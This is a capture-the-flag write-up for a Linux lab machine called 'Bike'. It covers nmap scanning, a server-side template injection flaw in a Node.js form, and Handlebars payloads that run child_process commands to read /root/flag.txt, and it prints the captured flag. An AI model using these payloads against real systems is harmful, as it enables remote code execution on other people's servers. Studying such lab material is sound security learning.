System: Linux
Difficulty: Very Easy

IP Address: 10.129.97.64

# User Flag

The ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.97.64 -p- -v
```

2 Ports were detected from the result.
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Detailed information about each port.
```
kali@kali:~$ sudo nmap 10.129.97.64 -sC -sV -p22,80
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After examining the technologies through Wappalyzer, it is possible to see that it uses Node.js. The input form is also vulnerable to SSTI attack, according to the template payload `{{7*7}}` entered in the input.

Through HackTricks, there is a sample payload to use for it.
```
{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub "constructor")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push "return require('child_process').exec('whoami');"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}
```

This payload will be URL Encoded and then passed as a parameter in Burp Suite.
However, the exec command is blocked according to the server, so another payload is used instead.
```
{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub "constructor")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push "return process;"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}
```

This is the results of the command.
```
We will contact you at:    e 2 [object Object]  function Function() { [native code] } 2 [object Object]   [object process]   
```

This command is used to query the root flag contents.
```
{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub "constructor")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}
```

This is the results of the command.
```
We will contact you at:    e 2 [object Object]  function Function() { [native code] } 2 [object Object]   6b258d726d287462d60c103d0142a81c
```

The flag contents is in below.
```
6b258d726d287462d60c103d0142a81c
```
